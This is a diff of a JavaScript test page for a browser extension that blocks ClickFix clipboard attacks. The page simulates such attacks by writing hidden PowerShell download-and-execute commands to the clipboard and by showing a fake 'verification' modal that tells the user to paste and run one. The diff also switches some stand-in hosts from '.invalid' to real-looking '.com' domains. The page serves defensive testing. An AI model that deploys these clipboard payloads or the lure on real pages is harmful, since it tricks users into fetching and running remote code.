@@ -3,6 +3,27 @@
  * Mimics an external malicious script that attempts to write a PowerShell payload
  * to the user's clipboard.
  */
+
+// Non-blocking status display (replaces alert() which freezes the event loop
+// and prevents the extension's content_script.js from processing messages)
+function showStatus(message, isBlocked) {
+  const el = document.createElement('div');
+  el.textContent = message;
+  el.style.cssText = `
+    position: fixed; top: 16px; left: 50%; transform: translateX(-50%);
+    padding: 12px 24px; border-radius: 12px; font-size: 14px; font-weight: 600;
+    z-index: 999999; animation: fadeout 4s forwards;
+    color: white; font-family: 'Plus Jakarta Sans', sans-serif;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+    background: ${isBlocked ? '#dc2626' : '#10b981'};
+  `;
+  const style = document.createElement('style');
+  style.textContent = '@keyframes fadeout { 0%,70% { opacity:1 } 100% { opacity:0 } }';
+  document.head.appendChild(style);
+  document.body.appendChild(el);
+  setTimeout(() => { el.remove(); style.remove(); }, 4000);
+}
+
 function triggerClickFixAttack() {
   const payload = `powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (New-Object System.Net.WebClient).DownloadString('https://evil-cdn.example.com/update.ps1')"`;
   
@@ -11,11 +32,11 @@ function triggerClickFixAttack() {
   navigator.clipboard.writeText(payload)
     .then(() => {
       console.log("[Test] ✅ Success: Clipboard write succeeded (Click Fixed DID NOT block it).");
-      alert("Success: Clipboard write succeeded. Check console logs.");
+      showStatus("⚠️ Clipboard write succeeded — extension did not block it!", false);
     })
     .catch((err) => {
       console.warn("[Test] 🛑 Blocked: Clipboard write failed:", err.message);
-      alert("Blocked: Clipboard write failed: " + err.message);
+      showStatus("🛡️ Blocked: " + err.message, true);
     });
 }
 
@@ -28,17 +49,17 @@ function triggerObfuscatedAttack() {
   navigator.clipboard.writeText(payload)
     .then(() => {
       console.log("[Test] ✅ Success: Obfuscated write succeeded (Bypassed!).");
-      alert("Success: Obfuscated write succeeded.");
+      showStatus("⚠️ Obfuscated write succeeded — bypassed!", false);
     })
     .catch((err) => {
       console.warn("[Test] 🛑 Blocked: Obfuscated write failed:", err.message);
-      alert("Blocked: Obfuscated write failed: " + err.message);
+      showStatus("🛡️ Blocked: " + err.message, true);
     });
 }
 
 function triggerClipboardItemAttack() {
   // Uses navigator.clipboard.write with ClipboardItem instead of writeText
-  const payload = `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://badsite.invalid/loader.txt')"`;
+  const payload = `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://badsite.com/loader.txt')"`;
   
   console.log("[Test] Attempting ClipboardItem write attack...");
 
@@ -48,11 +69,11 @@ function triggerClipboardItemAttack() {
   navigator.clipboard.write([item])
     .then(() => {
       console.log("[Test] ✅ Success: ClipboardItem write succeeded (Bypassed!).");
-      alert("Success: ClipboardItem write succeeded.");
+      showStatus("⚠️ ClipboardItem write succeeded — bypassed!", false);
     })
     .catch((err) => {
       console.warn("[Test] 🛑 Blocked: ClipboardItem write failed:", err.message);
-      alert("Blocked: ClipboardItem write failed: " + err.message);
+      showStatus("🛡️ Blocked: " + err.message, true);
     });
 }
 
@@ -64,11 +85,11 @@ function triggerSafeCopy() {
   navigator.clipboard.writeText(payload)
     .then(() => {
       console.log("[Test] ✅ Success: Normal clipboard write succeeded.");
-      alert("Success: Safe copy completed.");
+      showStatus("✅ Safe copy completed successfully.", false);
     })
     .catch((err) => {
       console.error("[Test] ❌ Error: Normal clipboard write failed:", err.message);
-      alert("Error: Safe copy failed: " + err.message);
+      showStatus("❌ Safe copy failed: " + err.message, true);
     });
 }
 
@@ -108,7 +129,7 @@ function triggerProactiveModalLure() {
       3. Press Enter to run the PowerShell verification script.
     </div>
     <div style="background:#020617; padding:10px; border-radius:6px; font-family:monospace; font-size:12px; word-break:break-all; margin-bottom:16px; border:1px solid #1e293b; color:#10b981;">
-      powershell.exe -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://evil.invalid/verify.ps1')
+      powershell.exe -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://evil.com/verify.ps1')
     </div>
     <div style="display:flex; justify-content:flex-end; gap:8px;">
       <button id="lure-cancel-btn" style="background:#334155; border:none; padding:8px 16px; border-radius:6px; color:white; cursor:pointer; font-weight:bold;">Cancel</button>
@@ -122,13 +143,13 @@ function triggerProactiveModalLure() {
     modal.remove();
   });
   modal.querySelector("#lure-copy-btn").addEventListener("click", () => {
-    const payload = "powershell.exe -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://evil.invalid/verify.ps1')";
+    const payload = `powershell.exe -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://evil.com/verify.ps1')`;
     navigator.clipboard.writeText(payload)
       .then(() => {
-        alert("Verification command copied! (ClickFixed did NOT block this — check extension status)");
+        showStatus("⚠️ Verification command copied — extension did not block!", false);
       })
-      .catch(() => {
-        alert("Blocked: ClickFixed intercepted the clipboard write.");
+      .catch((err) => {
+        showStatus("🛡️ Blocked: ClickFixed intercepted the clipboard write.", true);
       });
   });
 }
@@ -147,4 +168,3 @@ document.addEventListener("DOMContentLoaded", () => {
   if (btnClipboardItem) btnClipboardItem.addEventListener("click", triggerClipboardItemAttack);
   if (btnProactive) btnProactive.addEventListener("click", triggerProactiveModalLure);
 });
-
